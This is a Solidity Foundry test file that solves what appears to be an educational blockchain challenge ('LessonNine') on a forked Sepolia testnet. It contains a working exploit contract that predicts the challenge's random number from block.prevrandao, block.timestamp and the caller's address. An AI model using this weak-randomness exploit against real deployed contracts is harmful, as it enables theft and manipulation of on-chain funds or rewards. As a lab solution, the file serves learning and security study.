// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {ILessonNine} from "../src/ILessonNine.sol";

/**
 * @title HackLessonNine
 * @author kode-n-rolla
 * @notice Exploit contract that predicts the random number and calls solveChallenge.
 */
contract HackLessonNine {
    ILessonNine public target;
    string public handle;

    constructor(address _target, string memory _handle) {
        target = ILessonNine(_target);
        handle = _handle;
    }

    function run() public {
        uint256 guess = uint256(
            keccak256(
                abi.encodePacked(address(this), block.prevrandao, block.timestamp)
            )
        ) % 100000;

        target.solveChallenge(guess, handle);
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

/**
 * @title HackSolve
 * @author kode-n-rolla
 * @notice Foundry test contract to run the exploit on LessonNine using a forked Sepolia network.
 */
contract HackSolve is Test {
    uint256 fork;
    address TARGET;
    address attackerEOA = 0x97154a62Cd5641a577e092d2Eee7e39Fcb3333Dc;

    function setUp() public {
        string memory rpc = vm.envString("SEPOLIA_RPC");
        uint256 blockNum = vm.envUint("FORK_BLOCK");
        TARGET = vm.envAddress("TARGET");

        fork = vm.createFork(rpc, blockNum);
        vm.selectFork(fork);

        // Set timestamp and provide funds
        vm.warp(1755355572);
        vm.deal(attackerEOA, 1 ether);
    }

    function test_ExploitWithInternalCall() public {
        vm.selectFork(fork);
        vm.startPrank(attackerEOA);

        HackLessonNine hack = new HackLessonNine(TARGET, "0xsolver");
        hack.run();

        vm.stopPrank();
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
